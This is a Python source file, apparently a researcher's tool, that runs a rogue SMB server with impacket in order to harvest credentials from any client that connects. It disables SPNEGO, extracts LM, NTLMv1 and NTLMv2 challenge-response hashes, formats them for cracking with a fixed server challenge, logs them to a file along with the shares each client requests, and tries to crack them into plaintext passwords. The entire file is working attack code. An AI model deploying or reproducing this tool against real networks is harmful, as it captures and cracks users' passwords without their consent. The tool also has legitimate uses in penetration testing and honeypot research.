from impacket import smbserver, smb
import ntpath
from threading import RLock
import json

from quickcrack import try_to_crack_hash

"""
This script acts as an SMB server and gathers credentials from connecting users.
Developed by Brian Wallace @botnet_hutner
"""


sessions = {}
output_file_lock = RLock()


def report_authentication_attempt(connId, auth_details):
    global output_file_lock
    sessions[connId] = {"authentication": auth_details, "shares": []}
    with output_file_lock:
        with open("credentials.txt", "a") as f:
            f.write(json.dumps(auth_details) + "\n")
    if "UnicodePwd" in auth_details and auth_details['UnicodePwd'] != "":
        print "{0}: {1}".format(auth_details['client_ip'], auth_details['UnicodePwd'])
        password = try_to_crack_hash(auth_details['UnicodePwd'])
        if password is not None:
            print "{0}: {1}::{2} has password '{3}'".format(auth_details['client_ip'], auth_details["PrimaryDomain"], auth_details['Account'], password)
    if "AnsiPwd" in auth_details and auth_details['AnsiPwd'] != "":
        print "{0}: {1}".format(auth_details['client_ip'], auth_details['AnsiPwd'])
        password = try_to_crack_hash(auth_details['AnsiPwd'])
        if password is not None:
            print "{0}: {1}::{2} has password '{3}'".format(auth_details['client_ip'], auth_details["PrimaryDomain"], auth_details['Account'], password)


def report_tree_connect_attempt(connId, connect_details):
    session = sessions[connId]
    if "client_ip" in session:
        print "{2}: {0} accessed {1}".format(session['client_ip'], connect_details['Path'], connId)
    session['shares'].append(connect_details)
    sessions[connId] = session


def smbCommandHook_SMB_COM_SESSION_SETUP_ANDX(connId, smbServer, SMBCommand, recvPacket):
    # Accept any authentication except for empty authentication
    supplied_creds = False
    # The following is impacket code modified to extract credentials
    connData = smbServer.getConnectionData(connId, checkStatus=False)
    respSMBCommand = smb.SMBCommand(smb.SMB.SMB_COM_SESSION_SETUP_ANDX)

    # Process Standard Security
    respParameters = smb.SMBSessionSetupAndXResponse_Parameters()
    respData       = smb.SMBSessionSetupAndXResponse_Data()
    sessionSetupParameters = smb.SMBSessionSetupAndX_Parameters(SMBCommand['Parameters'])
    sessionSetupData = smb.SMBSessionSetupAndX_Data(flags=recvPacket['Flags2'])
    sessionSetupData['AnsiPwdLength'] = sessionSetupParameters['AnsiPwdLength']
    sessionSetupData['UnicodePwdLength'] = sessionSetupParameters['UnicodePwdLength']
    sessionSetupData.fromString(SMBCommand['Data'])
    connData['Capabilities'] = sessionSetupParameters['Capabilities']

    # Let's get those credentials
    to_extract_from_session_setup_data = [
        "Account",
        "AnsiPwd",
        "NativeLanMan",
        "UnicodePwd",
        "NativeOS",
        "PrimaryDomain",
    ]

    extracted_data = {}
    for key in (i for i in to_extract_from_session_setup_data if i in sessionSetupData.__dict__['fields']):
        extracted_data[key] = sessionSetupData[key]

    if 'AnsiPwd' in extracted_data:
        if len([i for i in extracted_data['AnsiPwd'] if i != "\x00"]) == 0:
            # It's null, we should just remove it
            extracted_data['AnsiPwd'] = ""
        elif len(extracted_data['AnsiPwd']) == 24:
            if 'UnicodePwd' in extracted_data and extracted_data['AnsiPwd'] == extracted_data['UnicodePwd']:
                # Hash has been duplicated across fields, likely NTLM, not LM
                extracted_data['AnsiPwd'] = ""
            else:
                extracted_data['AnsiPwd'] = extracted_data['AnsiPwd'].encode("hex")  # long live Python 2.7
                extracted_data['AnsiPwd'] = "{1}:$NETLM$1122334455667788${0}".format(extracted_data['AnsiPwd'], extracted_data['Account'] if 'Account' in extracted_data else "")
                supplied_creds = True
        else:
            # its plaintext? lol
            supplied_creds = True
            pass

    if 'UnicodePwd' in extracted_data:
        if len(extracted_data['UnicodePwd']) >= 56:
            # NTLMv2
            hmac = extracted_data['UnicodePwd'][0:16].encode("hex")
            rest = extracted_data['UnicodePwd'][16:].encode("hex")
            extracted_data['UnicodePwd'] = "{0}::{1}:1122334455667788:{2}:{3}".format(extracted_data['Account'] if 'Account' in extracted_data else "", extracted_data['PrimaryDomain'] if 'PrimaryDomain' in extracted_data else "", hmac, rest)
            supplied_creds = True
        elif len(extracted_data['UnicodePwd']) == 24:
            # NTLMv1?
            extracted_data['UnicodePwd'] = extracted_data['UnicodePwd'].encode("hex")
            extracted_data['UnicodePwd'] = "{1}:$NETNTLM$1122334455667788${0}".format(extracted_data['UnicodePwd'], extracted_data['Account'] if 'Account' in extracted_data else "")
            supplied_creds = True

    conn_data = smbServer.getConnectionData(connId, False)
    extracted_data['client_ip'] = conn_data['ClientIP']
    report_authentication_attempt(connId, extracted_data)

    errorCode = smbserver.STATUS_SUCCESS if supplied_creds else smbserver.STATUS_LOGON_FAILURE
    connData['Uid'] = 10
    respParameters['Action'] = 0
    smbServer.log('User %s\\%s authenticated successfully (basic)' % (sessionSetupData['PrimaryDomain'], sessionSetupData['Account']))

    respData['NativeOS'] = smbserver.encodeSMBString(recvPacket['Flags2'], smbServer.getServerOS())
    respData['NativeLanMan'] = smbserver.encodeSMBString(recvPacket['Flags2'], smbServer.getServerOS())
    respSMBCommand['Parameters'] = respParameters
    respSMBCommand['Data'] = respData
    connData['Authenticated'] = supplied_creds
    smbServer.setConnectionData(connId, connData)

    return [respSMBCommand], None, errorCode


def smbCommandHook_SMB_COM_NEGOTIATE(connId, smbServer, SMBCommand, recvPacket):
    if recvPacket['Flags2'] & smb.SMB.FLAGS2_EXTENDED_SECURITY:
        recvPacket['Flags2'] -= smb.SMB.FLAGS2_EXTENDED_SECURITY
    return smbserver.SMBCommands.smbComNegotiate(smbserver.SMBCommands(), connId, smbServer, SMBCommand, recvPacket)


def smbCommandHook_SMB_COM_TREE_CONNECT_ANDX(connId, smbServer, SMBCommand, recvPacket):
    treeConnectAndXParameters = smb.SMBTreeConnectAndX_Parameters(SMBCommand['Parameters'])

    treeConnectAndXData = smb.SMBTreeConnectAndX_Data(flags=recvPacket['Flags2'])
    treeConnectAndXData['_PasswordLength'] = treeConnectAndXParameters['PasswordLength']
    treeConnectAndXData.fromString(SMBCommand['Data'])

    path = smbserver.decodeSMBString(recvPacket['Flags2'], treeConnectAndXData['Path'])
    local_path = ntpath.basename(path)
    service = smbserver.decodeSMBString(recvPacket['Flags2'], treeConnectAndXData['Service'])

    report_tree_connect_attempt(connId, {"Path": path, "local_path": local_path, "Service": service})

    return smbserver.SMBCommands.smbComTreeConnectAndX(smbserver.SMBCommands(), connId, smbServer, SMBCommand, recvPacket)


# Overriding this allows us to claim we have no shares, so we still get ANDX data, but don't need to share anything
def override_searchShare(connId, share, smbServer):
    return None

smbserver.searchShare = override_searchShare

if __name__ == "__main__":
    smbConfig = smbserver.ConfigParser.ConfigParser()
    smbConfig.add_section('global')
    smbConfig.set('global', 'server_name', 'server_name')
    smbConfig.set('global', 'server_os', 'UNIX')
    smbConfig.set('global', 'server_domain', 'WORKGROUP')
    smbConfig.set('global', 'log_file', 'smb.log')
    smbConfig.set('global', 'credentials_file', '')

    smbConfig.add_section('IPC$')
    smbConfig.set('IPC$', 'comment', '')
    smbConfig.set('IPC$', 'read only', 'yes')
    smbConfig.set('IPC$', 'share type', '3')
    smbConfig.set('IPC$', 'path', '')

    server = smbserver.SMBSERVER(('0.0.0.0', 445), config_parser=smbConfig)
    server.processConfigFile()
    server.registerNamedPipe('srvsvc', ('0.0.0.0', 4344))

    # Auth and information gathering hooks
    # Hook session setup to grab the credentials and deny any empty authentication requests
    server.hookSmbCommand(smb.SMB.SMB_COM_SESSION_SETUP_ANDX, smbCommandHook_SMB_COM_SESSION_SETUP_ANDX)
    # Hook the negotiate call to disable SPNEGO
    server.hookSmbCommand(smb.SMB.SMB_COM_NEGOTIATE, smbCommandHook_SMB_COM_NEGOTIATE)
    # Hook tree connect
    server.hookSmbCommand(smb.SMB.SMB_COM_TREE_CONNECT_ANDX, smbCommandHook_SMB_COM_TREE_CONNECT_ANDX)

    server.serve_forever()